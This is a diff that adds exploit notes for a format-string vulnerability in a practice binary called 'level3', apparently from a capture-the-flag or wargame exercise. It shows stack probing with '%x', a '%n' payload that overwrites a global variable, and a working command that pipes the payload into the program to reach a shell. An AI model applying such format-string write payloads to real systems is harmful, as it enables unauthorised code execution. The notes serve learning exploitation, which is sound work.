@@ -1,0 +1,65 @@
+# Format String Analysis for Level3
+# ===================================
+
+# Target Information
+# ==================
+TARGET_VARIABLE = "m"
+TARGET_ADDRESS = 0x0804988c
+TARGET_VALUE = 64 (0x40)
+
+# Format String Vulnerability
+# ============================
+# Vulnerable function: printf(local_20c)
+# Input method: fgets(local_20c, 0x200, stdin)
+# Buffer size: 520 bytes
+
+# Stack Layout Discovery
+# ======================
+# Test payload: "AAAA%x.%x.%x.%x.%x"
+# Output: AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825
+# 
+# Analysis:
+# Position 1: 200 (hex value)
+# Position 2: b7fd1ac0 (libc address)
+# Position 3: b7ff37d0 (stack address)
+# Position 4: 41414141 (our "AAAA" input)
+# Position 5: 252e7825 (format string continuation)
+
+# Exploit Construction
+# ====================
+# Goal: Write 64 to address 0x0804988c using %n
+# Method: Control character count before %n
+
+# Payload Structure:
+# [target_address (4 bytes)] + [padding] + [%4$n]
+
+# Character Count Calculation:
+# - Address bytes: 4
+# - Needed total: 64
+# - Padding required: 64 - 4 = 60 characters
+
+# Final Payload:
+EXPLOIT_PAYLOAD = '\x8c\x98\x04\x08' + '%60x' + '%4$n'
+
+# Payload Breakdown:
+# \x8c\x98\x04\x08  = Target address (little-endian)
+# %60x              = Print 60 hex characters (padding)
+# %4$n              = Write character count to 4th parameter
+
+# Execution Result:
+# ==================
+# Characters printed: 4 (address) + 60 (padding) = 64
+# %4$n writes 64 to address at stack position 4
+# Address at position 4 = 0x0804988c (variable m)
+# Result: m = 64
+# Condition (m != 0x40) becomes (64 != 64) = false
+# Program continues to system("/bin/sh")
+
+# Working Exploit Command:
+(python -c "print('\x8c\x98\x04\x08' + '%60x' + '%4\$n')"; cat) | ./level3
+
+# Format String Specifiers Used:
+# %x    = Print hexadecimal value
+# %4$x  = Print value at 4th parameter position
+# %4$n  = Write character count to address at 4th parameter
+# %60x  = Print hex value with 60-character width (padding)
